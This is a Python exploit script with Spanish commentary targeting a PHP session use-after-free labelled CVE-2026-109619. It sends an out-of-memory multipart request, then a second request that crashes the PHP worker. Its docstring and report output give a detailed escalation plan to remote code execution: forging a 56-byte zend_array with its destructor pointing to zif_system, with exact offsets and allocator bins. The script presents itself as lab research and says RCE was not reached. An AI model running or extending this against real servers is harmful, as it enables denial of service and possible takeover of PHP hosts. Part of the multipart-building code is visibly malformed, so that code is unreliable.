#!/usr/bin/env python3
"""
php2shell_rce.py — Escalada a ejecucion remota de codigo sobre
CVE-2026-109619 (PHP2Shell), basado en el mecanismo REAL verificado.

AVISO DE SEGURIDAD
------------------
Material de investigacion defensiva. Solo contra servidores que controlas o
con autorizacion escrita explicita. El objetivo previsto es un contenedor
Docker local con ASLR desactivado.

=============================================================================
ESTADO
=============================================================================
La RCE completa NO se ha logrado en este trabajo. Este script es el
andamiaje de la escalada, construido sobre los datos medidos en el binario
instrumentado, NO sobre suposiciones.

Lo que SI esta verificado y reproducido (ver BLOG.md, seccion 10):
  - El trigger de OOM con ~536 KB de cuerpo HTTP.
  - El use-after-free en el Request B, con 100% de reproducibilidad.
  - El aislamiento del puntero responsable: PS(http_session_vars).
  - Que el binario instrumentado registra la direccion exacta de la
    zend_array de sesion y el punto donde el Request B la consume.

Lo que NO se ha logrado (y por tanto NO se afirma):
  - La reclamacion efectiva del slot liberado con una zend_array forjada.
  - La ejecucion efectiva de un comando.

=============================================================================
MECANISMO REAL (verificado contra el codigo fuente de PHP 8.2.34)
=============================================================================
Request A — el OOM:
  multipart CON un file part + PHP_SESSION_UPLOAD_PROGRESS.
    -> MULTIPART_EVENT_FILE_START (session.c:3091 y :3117) cachea punteros
       CRUDOS a zvals de hashtables vivas:
           progress->post_bytes_processed
           progress->current_file_bytes_processed
    -> php_rinit_session(0) publica PS(id) y PS(http_session_vars) en el
       heap de la request, ANTES de que PG(modules_activated)=1.
    -> El parseo multipart agota memory_limit -> zend_bailout() (longjmp).
       MULTIPART_EVENT_END se salta; el RSHUTDOWN de session tambien
       (porque PG(modules_activated) sigue a 0); pero
       shutdown_memory_manager() se ejecuta igual y LIBERA el heap.
    -> El worker sobrevive con las globales de sesion colgando.

Request B — el consumidor (mismo worker):
  multipart SIN file part, CON PHP_SESSION_UPLOAD_PROGRESS.
    -> MULTIPART_EVENT_END -> php_session_rfc1867_cleanup() (session.c:2994)
       -> php_session_initialize()
       -> zend_hash_del(Z_ARRVAL_P(sess_var), ...) sobre PS(http_session_vars)
          liberada -> UAF -> SIGSEGV en zend_mm_alloc_small.

NOTA: una peticion CONCURRENTE con session_start() NO es lo que dispara el
fallo. Apache prefork reparte las peticiones entre procesos distintos, y la
experimentacion de este trabajo lo descarto. El disparador es el OOM.

=============================================================================
DATOS MEDIDOS EN EL BINARIO INSTRUMENTADO (no supuestos)
=============================================================================
Traza (/tmp/php2shell_trace.log) del target instrumentado:

  TRACK_INIT arr=0x7ffff7054310 gc=1 flags=0x8 nTableMask=0xfffffffe
             arData=0x7ffff64903c8 nNumUsed=0 nNumOfElements=0
             nTableSize=8 nInternalPointer=0
             nNextFreeElement=-9223372036854775808
             pDestructor=0x7ffff5c13d90 sizeof=56

  - sizeof(zend_array) = 56 bytes  -> bin 6 del allocator de Zend MM
    (el bin 6 cubre allocations de 49..56 bytes; formula en
     zend_alloc.c: zend_mm_small_size_to_bin()).
  - pDestructor observado = zval_ptr_dtor (offset 0x3d6d90 en libphp.so),
    NO zif_system. El destructor por defecto de una tabla hash.

CONSECUENCIA CRITICA (por que el spray anterior nunca funciono):
  El blob falsificado anterior media 288 bytes -> bin 68 del allocator.
  El slot liberado por la zend_array esta en el bin 6.
  Dos bins distintos NUNCA comparten bloques: el spray no podia
  reclamar el slot, por muy calibrado que estuviera. Esto no es un
  problema de timing ni de precision: es un problema de CLASE DE TAMAÑO.

PRIMITIVA DE ESCALADA (por construir)
-------------------------------------
La RCE no se obtiene forjando un zend_internal_function (eso NO funciona: su
invocacion exige un zend_execute_data valido). La via correcta es forjar un
zend_array/HashTable con pDestructor apuntando a zif_system: al destruirlo,
zend_array_destroy invoca pDestructor(&valor), que es exactamente la firma
de ZEND_FUNCTION(system).

LAYOUT DE zend_array (PHP 8.2, 64 bits) — la HashTable esta EMBEBIDA
(no hay .ht), uniones arData/arHash/arPacked:

    offset  0  zend_refcounted_h gc        (8 bytes: refcount + type_info)
    offset  8  u.flags                     (4 bytes)
    offset 12  nTableMask                  (4 bytes)
    offset 16  arData/arHash/arPacked      (8 bytes, puntero)
    offset 24  nNumUsed                    (4)
    offset 28  nNumOfElements              (4)
    offset 32  nTableSize                  (4)
    offset 36  nInternalPointer            (4)
    offset 40  nNextFreeElement            (8)
    offset 48  pDestructor                  (8)
    ---- total 56 bytes

Para que un allocation de 56 bytes reutilice el slot, el objeto forjado
debe medir TAMBIEN 56 bytes: no puede llevar carga util dentro de la
misma estructura. La carga (p.ej. el comando a ejecutar) debe vivir en
otro allocation (un zend_string) al que apunte la estructura.

LAYOUT DE zend_internal_function (PHP 8.2, 64 bits) — verificado con un
programa C de offsetof contra Zend/zend_compile.h:
     0 type | 4 fn_flags | 8 function_name | 16 scope | 24 prototype
    32 num_args | 36 required_num_args | 40 arg_info | 48 attributes
    56 T | 64 run_time_cache | 72 handler | 80 module
Tamano total: 136 bytes (los "288" de la literatura son el tamano total de
la asignacion en el heap, no el de la struct).
"""

from __future__ import annotations

import argparse
import os
import random
import socket
import string
import struct
import subprocess
import sys
import time

# --- Layout de zend_array en PHP 8.2 (medido, no supuesto) ---------------
ZEND_ARRAY_SIZE = 56

OFF_GC = 0x00            # zend_refcounted_h
OFF_FLAGS = 0x08        # u.flags
OFF_TABLE_MASK = 0x0C   # nTableMask
OFF_AR_DATA = 0x10      # arData / arHash / arPacked
OFF_NUM_USED = 0x18     # nNumUsed
OFF_NUM_ELEMENTS = 0x1C
OFF_TABLE_SIZE = 0x20
OFF_INTERNAL_PTR = 0x24
OFF_NEXT_FREE = 0x28    # zend_long
OFF_PDESTRUCTOR = 0x30  # dtor_func_t

# --- Layout de zend_internal_function (PHP 8.2, 64 bits) -----------------
ZIF_SIZE = 136
ZIF_OFF_TYPE = 0x00
ZIF_OFF_NAME = 0x08
ZIF_OFF_HANDLER = 0x48  # 72
ZIF_OFF_MODULE = 0x50   # 80

ZEND_INTERNAL = 1


def zend_bin(size: int) -> int:
    """Devuelve el indice de bin del allocator de Zend MM para un tamano.

    Reproduce zend_mm_small_size_to_bin() de Zend/zend_alloc.c.
    Para size <= 64: bin = (size - !!size) >> 3.
    """
    if size <= 64:
        return (size - (1 if size else 0)) >> 3
    t1 = size - 1
    t2 = (t1.bit_length() ^ 0x1F) + 1 - 3
    t1 = t1 >> t2
    t2 = (t2 - 3) << 2
    return t1 + t2


def rand_str(n: int) -> str:
    alpha = string.ascii_letters + string.digits
    return "".join(random.choice(alpha) for _ in range(n))


def find_offsets(binary: str):
    """Extrae offsets de simbolos del binario (nm)."""
    try:
        out = subprocess.run(["nm", binary], capture_output=True,
                             text=True, timeout=60).stdout
    except Exception:
        return None
    syms = {}
    for line in out.splitlines():
        p = line.split()
        if len(p) == 3:
            syms[p[2]] = int(p[0], 16)
    for want in ("zif_system", "zval_ptr_dtor", "zend_array_destroy",
                 "zend_hash_del"):
        if want not in syms:
            return None
    return syms


def read_trace(container: str = "php2shell-trace") -> str:
    """Lee la traza de instrumentacion del container."""
    try:
        out = subprocess.run(
            ["docker", "exec", container, "cat", "/tmp/php2shell_trace.log"],
            capture_output=True, text=True, timeout=30).stdout
        return out
    except Exception:
        return ""


def parse_trace(text: str) -> dict:
    """Extrae la informacion clave de la traza."""
    info = {"track_init": None, "cleanup": None}
    for line in text.splitlines():
        if line.startswith("TRACK_INIT"):
            info["track_init"] = line
        elif line.startswith("CLEANUP"):
            info["cleanup"] = line
    return info


def build_oom_body(boundary: str, depth: int, records: int) -> bytes:
    """Cuerpo multipart que agota memory_limit.

    Cada registro necesita un nombre TOP-LEVEL DISTINTO: si comparten
    prefijo, PHP fusiona los arboles $_FILES y no hay presion de memoria
    (falso negativo observado en la experimentacion).

    El nombre tiene 'depth' niveles de anidacion y filename="" (vacio):
    un file vacio no cuenta para max_file_uploads, pero PHP sigue creando
    las entradas anidadas en $_FILES, que es lo que consume el heap.
    """
    parts = [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        # Un file part real: dispara FILE_START (php_rinit_session + update).
        {"name": "fz", "filename": "a.txt", "data": b"A" * 64},
    ]
    for i in range(records):
        name = f"f{i}[" + "][".join(f"a{j}" for j in range(depth)) + "]"
        parts.append({"name": name, "filename": "", "data": b""})
    return _multipart(parts, boundary)


def _multipart(parts, boundary: str) -> bytes:
    """Construye un cuerpo multipart/form-data a partir de partes."""
    out = bytearray()
    for p in parts:
        out += f"--{boundary}\r\n".encode()
        out += f'Content-Disposition: form-data; name="{p["name"]}"\r\n'.encode()
        if p.get("filename") is not None:
            out += f'; filename="{p["filename"]}"\r\n'.encode()
            out += b"Content-Type: application/octet-stream\r\n"
        out += b"\r\n" + p["data"] + b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return bytes(out)


def post_raw(host: str, port: int, path: str, body: bytes, boundary: str,
             cookie: str, timeout: float = 120.0) -> bytes:
    """Envia un POST multipart crudo y devuelve la respuesta completa."""
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: {cookie}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        sock.sendall(req)
        chunks = []
        while True:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
        return b"".join(chunks)
    finally:
        sock.close()


def post_trigger(host: str, port: int, path: str, boundary: str,
                 cookie: str, timeout: float = 60.0) -> bytes:
    """Request B: multipart CON PHP_SESSION_UPLOAD_PROGRESS pero SIN file part.

    Es la peticion que consume el estado colgante (UAF).
    """
    body = _multipart(
        [
            {"name": "PHPSESSID", "data": cookie.split("=", 1)[-1].encode()},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ],
        boundary,
    )

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: {cookie}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        sock.sendall(req)
        chunks = []
        while True:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
        return b"".join(chunks)
    finally:
        sock.close()


def cmd_report(args) -> int:
    """Muestra el estado medido del laboratorio: sizes, bins y traza."""
    print("=" * 70)
    print("PHPSHELL RCE — informe de estado (medido, no supuesto)")
    print("=" * 70)

    print()
    print("--- Layout zend_array (PHP 8.2, 64 bits) ---")
    print(f"  sizeof(zend_array)      = {ZEND_ARRAY_SIZE} bytes")
    print(f"  off pDestructor         = 0x{OFF_PDESTRUCTOR:02X}")
    print(f"  off arData              = 0x{OFF_AR_DATA:02X}")
    print(f"  bin del allocator       = {zend_bin(ZEND_ARRAY_SIZE)} "
          f"(49..56 bytes)")

    print()
    print("--- Layout zend_internal_function ---")
    print(f"  sizeof                  = {ZIF_SIZE} bytes")
    print(f"  off handler             = 0x{ZIF_OFF_HANDLER:02X}")
    print(f"  off module              = 0x{ZIF_OFF_MODULE:02X}")

    print()
    print("--- Consecuencia del tamano (el fallo del spray anterior) ---")
    print(f"  blob anterior: 288 bytes -> bin {zend_bin(288)}")
    print(f"  slot real:     {ZEND_ARRAY_SIZE} bytes -> bin {zend_bin(ZEND_ARRAY_SIZE)}")
    if zend_bin(288) != zend_bin(ZEND_ARRAY_SIZE):
        print("  -> CLASES DISTINTAS: el spray NO podia reclamar el slot.")

    if args.container:
        print()
        print(f"--- Traza en vivo ({args.container}) ---")
        trace = read_trace(args.container)
        if not trace.strip():
            print("  (vacia o inaccesible)")
        else:
            info = parse_trace(trace)
            for key in ("track_init", "cleanup"):
                val = info.get(key)
                if val:
                    print(f"  {val}")
                else:
                    print(f"  ({key}: sin datos)")

    print()
    print("--- Proximo paso tecnico ---")
    print("  1. Instrumentar zend_mm_alloc_small para ver que bloque")
    print("     ocupa el slot tras el OOM.")
    print("  2. Forjar un zend_array de 56 bytes con pDestructor=zif_system,")
    print("     en el bin 6, y forzar su colocacion en ese slot concreto.")
    print("  3. El payload (comando) debe vivir en OTRO allocation")
    print("     (zend_string), no dentro de los 56 bytes de la struct.")
    return 0


def cmd_probe(args) -> int:
    """Ejecuta el escenario OOM -> Request B y recoge la traza."""
    boundary = rand_str(24)
    sid = rand_str(24)

    print(f"[*] Request A (OOM) hacia {args.host}:{args.port} ...")
    body = build_oom_body(boundary, args.depth, args.records)
    print(f"    cuerpo: {len(body)} bytes, {args.records} registros anidados")
    resp = post_raw(args.host, args.port, args.path, body, boundary,
                    f"PHPSESSID={sid}")
    oom = b"exhausted" in resp
    print(f"    OOM: {oom}")
    if not oom:
        print("[!] No se disparo el OOM: revisa memory_limit y registros.")
        return 1

    time.sleep(0.5)

    print("[*] Request B (consumidor del estado colgante) ...")
    try:
        resp2 = post_trigger(args.host, args.port, args.path,
                             rand_str(24), f"PHPSESSID={sid}")
        status = resp2.split(b"\r\n")[0].decode("latin-1", "replace")
        print(f"    respuesta: {status}")
        if not resp2:
            print("    -> conexion cerrada sin respuesta (posible SIGSEGV)")
    except (ConnectionResetError, BrokenPipeError, socket.timeout) as exc:
        print(f"    -> {type(exc).__name__}: el worker crasheo (UAF consumada)")

    if args.container:
        print()
        print("--- traza resultante ---")
        trace = read_trace(args.container)
        if trace.strip():
            for line in trace.splitlines():
                print(f"  {line}")
        else:
            print("  (vacia)")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Andamiaje de escalada a RCE para CVE-2026-109619 "
                    "(solo laboratorio local).")
    sub = ap.add_subparsers(dest="cmd")

    p_rep = sub.add_parser("report", help="informe de layout y bins medidos")
    p_rep.add_argument("--container", default="php2shell-trace",
                       help="container instrumentado del que leer la traza")
    p_rep.set_defaults(func=cmd_report)

    p_probe = sub.add_parser("probe", help="ejecuta OOM -> Request B y lee la traza")
    p_probe.add_argument("--host", default="127.0.0.1")
    p_probe.add_argument("--port", type=int, default=8084)
    p_probe.add_argument("--path", default="/index.php")
    p_probe.add_argument("--records", type=int, default=1500)
    p_probe.add_argument("--depth", type=int, default=12)
    p_probe.add_argument("--container", default="php2shell-trace")
    p_probe.set_defaults(func=cmd_probe)

    args = ap.parse_args()
    if not getattr(args, "func", None):
        args = ap.parse_args(["report"])
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
